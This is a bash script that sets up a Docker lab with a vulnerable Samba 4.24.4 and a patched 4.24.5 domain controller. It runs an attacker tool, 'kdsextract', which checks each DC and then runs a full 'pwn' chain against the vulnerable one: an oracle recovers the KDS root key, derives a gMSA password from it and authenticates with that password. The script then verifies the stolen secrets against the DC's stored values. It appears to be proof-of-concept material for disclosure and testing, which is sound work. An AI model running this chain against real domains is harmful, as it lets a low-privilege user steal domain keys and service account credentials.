#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"

REALM=lab.local
USER_DN="lowpriv@${REALM}"
PASSWORD=Lowpriv123!

say() { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }
fail() { printf '\n\033[1;31m!! FAIL: %s\033[0m\n' "$*"; exit 1; }

say "building images (Samba 4.24.4 vulnerable / 4.24.5 fixed from upstream git)"
docker compose build

say "starting the lab (first boot provisions both domains identically)"
docker compose up -d --wait

ATTACK="docker compose exec -T attacker kdsextract"
RUN_VULN="docker compose exec -T dc-vuln samba-tool"

say "ground truth: KDS root keys as seen by the DC (admin side)"
$RUN_VULN domain kds root-key list -H /usr/local/samba/private/sam.ldb --show-secrets --json

say "[1/3] vulnerability check - Samba 4.24.4 (expect VULNERABLE)"
$ATTACK check --host dc-vuln --user "$USER_DN" --password "$PASSWORD" --json
$ATTACK check --host dc-vuln --user "$USER_DN" --password "$PASSWORD" | grep -q VULNERABLE \
    || fail "dc-vuln did not report VULNERABLE"

say "[2/3] vulnerability check - Samba 4.24.5 (expect NOT VULNERABLE)"
$ATTACK check --host dc-fixed --user "$USER_DN" --password "$PASSWORD" --json
$ATTACK check --host dc-fixed --user "$USER_DN" --password "$PASSWORD" | grep -q "NOT VULNERABLE" \
    || fail "dc-fixed did not report NOT VULNERABLE"

say "[3/3] full chain against dc-vuln: oracle-recover root key -> derive gMSA password -> authenticate"
$ATTACK pwn --host dc-vuln --user "$USER_DN" --password "$PASSWORD" --verify-bind --json \
    | tee /tmp/kdse-pwn.json

say "comparing recovered root key + derived password against DC ground truth"
python3 - <<'EOF'
import base64, json, subprocess, sys

pwn = json.load(open("/tmp/kdse-pwn.json"))
if pwn.get("verdict") != "VULNERABLE":
    sys.exit("pwn verdict was not VULNERABLE")

def dc(*argsv):
    return subprocess.run(
        ["docker", "compose", "exec", "-T", "dc-vuln", "samba-tool", *argsv],
        capture_output=True, text=True, check=True).stdout

out = dc("domain", "kds", "root-key", "list",
         "-H", "/usr/local/samba/private/sam.ldb", "--show-secrets", "--json")
truth = {k["name"].lower(): k["msKds-RootKeyData"].lower() for k in json.loads(out)
         if "msKds-RootKeyData" in k}
if not truth:
    sys.exit("could not parse ground-truth root keys from samba-tool output:\n" + out)

ok = True
for key in pwn["root_keys"]:
    guid = key["guid"].lower()
    recovered = key.get("hex")
    actual = truth.get(guid)
    if recovered is None:
        print(f"  {guid}: RECOVERY FAILED ({key.get('error')})")
        ok = False
    elif recovered.lower() == actual:
        print(f"  {guid}: oracle-recovered msKds-RootKeyData == DC ground truth "
              f"({len(recovered)//2} bytes, {key.get('queries')} queries) OK")
    else:
        print(f"  {guid}: MISMATCH\n    oracle : {recovered}\n    truth  : {actual}")
        ok = False

for entry in pwn["gmsa"]:
    if entry.get("password") is None:
        print(f"  gMSA {entry['name']}: no password derived ({entry.get('error')})")
        ok = False
        continue
    account = entry["name"]
    if not account.endswith("$"):
        account += "$"
    out = dc("user", "getpassword", account,
             "-H", "/usr/local/samba/private/sam.ldb",
             "--attributes=unicodePwd")
    actual = ""
    for line in out.splitlines():
        if line.startswith("unicodePwd::"):
            actual = base64.b64decode(line.split("::", 1)[1].strip()).hex()
    ours = entry["password"]["nt_hash"]
    if actual and ours.lower() == actual.lower():
        print(f"  gMSA {entry['name']}: offline-derived NT hash == DC's stored "
              f"unicodePwd ({ours}) OK")
    else:
        print(f"  gMSA {entry['name']}: NT hash MISMATCH\n    derived : {ours}\n    DC      : {actual}")
        ok = False
    v = entry.get("bind_verify", {})
    if v.get("verified") is True:
        print(f"  gMSA {entry['name']}: derived password AUTHENTICATES as {v['principal']} OK")
    elif v.get("verified") is None and "surrogates" in (v.get("note") or ""):
        print(f"  gMSA {entry['name']}: bind check not applicable (unpaired "
              "UTF-16 surrogates in this password instance; NT-hash proof above)")
    elif v:
        print(f"  gMSA {entry['name']}: bind verify -> {v}")
        ok = False

sys.exit(0 if ok else 1)
EOF

say "ALL CHECKS PASSED"
printf '  vulnerable DC : oracle recovered msKds-RootKeyData (matches DC ground truth)\n'
printf '                  and the offline-derived gMSA password NT hash matches\n'
printf '                  the DC'\''s stored unicodePwd (authentication-ready)\n'
printf '  patched DC    : attribute operator injection rejected (invalidAttributeSyntax)\n\n'
